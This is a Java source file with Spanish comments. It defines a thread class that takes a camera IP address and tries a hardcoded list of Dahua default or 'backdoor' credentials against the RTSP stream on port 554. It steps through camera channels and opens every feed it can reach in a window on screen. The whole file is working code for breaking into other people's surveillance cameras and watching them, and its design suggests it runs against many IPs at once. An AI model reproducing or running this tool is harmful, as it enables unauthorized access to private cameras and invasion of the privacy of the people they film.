package dev.adrielgro;

import com.xuggle.mediatool.IMediaListener;
import com.xuggle.mediatool.IMediaReader;
import com.xuggle.mediatool.MediaListenerAdapter;
import com.xuggle.mediatool.ToolFactory;
import com.xuggle.mediatool.event.IVideoPictureEvent;
import com.xuggle.xuggler.IError;
import com.xuggle.xuggler.demos.VideoImage;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.util.Random;

class VideoThread implements Runnable {

    private static final String DAHUA_ACCOUNTS[][] = {{"888888", "888888"}, {"admin", "admin"}, {"666666", "666666"}}; // Cuentas Backdoor
    private static final int RTSP_PORT = 554; // Puerto por defecto para RTSP

    public static int openCamsNow = 0; //  Conteo de camaras(ventanas) abiertas

    private String ip; // IP de la camara

    private VideoImage mScreen; // Variable mScreen tipo VideoImage
    Random rand = new Random(); // Instancia de Random

    /* Constructor */
    public VideoThread(String ip) {
        this.ip = ip;
    }

    @Override
    public void run() {
        try { /* Sleep, recomendable cuando no hay limite y se ejecutan todos los hilos al mismo tiempo */
            int rnd = rand.nextInt(1000); // Numero random entre 0 y 1 segundo
            Thread.sleep(rnd); // Sleep entre 0 y 1 segundo para no ejecutar cada hilo en el mismo tiempo
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        boolean access = false; // Por defecto, declaramos que no tenemos acceso a la camara
        for (int i = 0; i < DAHUA_ACCOUNTS.length; i++) { // Vamos a recorrer todas las posibles cuentas, hasta poder acceder

            if(access) // Si anteriormente tuvimos acceso, no necesitamos intentar volver a entrar con otra cuenta
                break; // entonces salimos del bucle

            IError errPacket = null; // Variable con los errores de lectura de paquetes
            int cam = 1; // Inicializamos a la primer camara
            while(errPacket == null) { // mientras no existan errores, avanzamos a la siguiente camara de la misma IP
                String url = "rtsp://"+DAHUA_ACCOUNTS[i][0]+":"+DAHUA_ACCOUNTS[i][1]+"@"+ip+":"+RTSP_PORT+"/cam/realmonitor?channel="+cam+"&subtype=0";
                IMediaReader mediaReader = ToolFactory.makeReader(url); // Leemos la direccion
                mediaReader.setBufferedImageTypeToGenerate(BufferedImage.TYPE_3BYTE_BGR); // El Buffer de la imagen genrara una imagen en RGB
                mediaReader.setQueryMetaData(true);
                mediaReader.setCloseOnEofOnly(true); // Si ocurre un error, se forazara a cerrar la conexion
                mediaReader.addListener(mediaListener); // Ponemos la conexion a la escucha en un listener

                // Instanciamos la ventana y le asignamos propiedades
                mScreen = new VideoImage(); // Instanciamos la clase VideoImage
                mScreen.setDefaultCloseOperation(2); // DISPOSE_ON_CLOSE = 2 (al cerrar la ventana, se eliminará de memoria toda esta instancia)
                mScreen.setResizable(true); // Permitimos redimensionar la ventana
                mScreen.setTitle("IP: " + ip + " - Camera: " + cam); // Establecemos un titulo a la ventana

                Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize(); // Obtenemos el tamaño de la pantalla
                int rndWidth = rand.nextInt((int)screenSize.getWidth()); // Creamos un random entre 0 y el ancho de la pantalla
                int rndHeight = rand.nextInt((int)screenSize.getHeight()); // Creamos un random entre 0 y la altura de la pantalla

                mScreen.setLocation(rndWidth, rndHeight); // Establecemos una nueva localizacion de la ventana en la pantalla al azar

                try {
                    //System.out.println("Intentando conectarse a: " + mediaReader.getUrl());

                    for (int j = 0; j < 3; j++) { // Hacemos 3 intentos maximo para intentar leer paquetes
                        errPacket = mediaReader.readPacket(); // TODO: Muchas veces se queda leyendo el paquete y no pasa al siguiente paso, hace falta un timeout o algo similar.
                        if(errPacket == null) { // Si no hay errores en la conexion..
                            access = true; // Tuvimos exito al conectarnos
                            break; // Salimos de este ciclo
                        }
                    }
                    if(errPacket != null) // Si salimos del ciclo anterior con errores, entonces..
                        break; //Salimos del ciclo while

                    //System.out.println("Conectado a: " + mediaReader.getUrl());
                    System.out.println("Conectado a: " + ip + " - Camara: " + cam);

                    while(mScreen.isVisible() && mediaReader.isOpen()) {
                        //System.out.println("Leyendo paquetes: " + mediaReader.getUrl());
                        if (mediaReader != null) {
                            try {
                                errPacket = mediaReader.readPacket();

                                if(errPacket != null ) { // Si hay errores entonces..
                                    System.out.println("Error: " + errPacket);
                                    break; // Salimos del while
                                }
                            } catch(Exception e) {
                                //System.out.println("Desconectado de: " + mediaReader.getUrl());
                                break; // Salimos del while
                            }
                        }
                    }
                } catch(Exception e) {
                    //System.out.println("Error al conectarse a: " + mediaReader.getUrl());
                    errPacket = IError.make(-1); // Le indicamos a la variable que ha ocurrido un error
                }
                mediaReader.close(); // Terminamos con cualquier lectura de paquetes
                mScreen.dispose(); // Cerramos la ventana
                cam++; // Subimos el contador de la camara a previsualizar
            }
        }
        openCamsNow--;
    }

    private IMediaListener mediaListener = new MediaListenerAdapter() {
        int newWidth;
        int newHeight;
        @Override
        public void onVideoPicture(IVideoPictureEvent event) {
            try {
                BufferedImage bi = event.getImage(); // Obtenemos la imagen

                if(mScreen.getWidth() < 300) { // Si el ancho de la ventana es menor que 300
                    /* establecemos nuevas medidas  */
                    newWidth = 320;
                    newHeight = newWidth*bi.getHeight()/bi.getWidth() + 30;

                    /* establecemos el tamaño minimo para redimensionar la ventana */
                    Dimension dimensionMinSize = new Dimension(newWidth, newHeight);
                    mScreen.setMinimumSize(dimensionMinSize);
                    // El algoritmo no volvera a entrar a este condicional ya que no podra ser menor de 300
                }
                else { // Si es mayor o igual a 300, obtenemos la altura y anchura de la ventana
                    newWidth = mScreen.getWidth();
                    newHeight = mScreen.getHeight();
                }

                /* Redimensionamos la imagen */
                BufferedImage resizedImage = new BufferedImage(newWidth, newHeight, BufferedImage.TYPE_3BYTE_BGR); // Tamaño del contenedor
                Graphics2D g = resizedImage.createGraphics();
                g.drawImage(bi, 0, 0, newWidth, newHeight-30, null); // Tamaño de la imagen (restamos 30 por la altura que abarca del titulo)
                g.dispose();

                if (bi != null) // Si el buffer de la imagen no es nulo, entonces..
                    mScreen.setImage(resizedImage); // Establecemos la imagen en la ventana

            } catch(Exception ex){
                //ex.printStackTrace();
            }
        }
    };

}